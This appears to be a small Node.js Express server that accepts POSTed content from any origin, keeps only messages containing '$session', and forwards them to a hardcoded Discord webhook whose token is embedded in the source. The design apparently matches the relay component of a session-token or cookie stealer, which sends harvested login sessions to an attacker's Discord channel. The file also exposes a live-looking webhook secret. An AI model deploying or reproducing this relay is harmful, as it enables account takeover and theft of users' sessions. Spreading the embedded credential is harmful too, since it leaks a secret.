import express from 'express';
import cors from 'cors';
import fetch from 'node-fetch';

const app = express();
app.use(cors()); // Enable CORS for all origins
app.use(express.json());

const DISCORD_WEBHOOK_URL = 'https://ptb.discord.com/api/webhooks/1363135609601917199/-XCwFzteRcZQW5u98yN9oP86P55-kaErK8QNP8m4p7eaTH1GTuRbaewg9qnx-ljs9J-k';

app.post('/send-webhook', async (req, res) => {
  try {
    const { content } = req.body;

    if (!content || !content.includes('$session')) {
      return res.status(400).json({ error: 'Invalid content' });
    }

    const discordRes = await fetch(DISCORD_WEBHOOK_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ content }),
    });

    if (!discordRes.ok) {
      return res.status(500).json({ error: 'Failed to send to Discord' });
    }

    res.json({ success: true });
  } catch (err) {
    console.error('Error in /send-webhook:', err);
    res.status(500).json({ error: 'Internal Server Error' });
  }
});

const PORT = process.env.PORT || 10000;
app.listen(PORT, () => {
  console.log(`Server listening on port ${PORT}`);
});
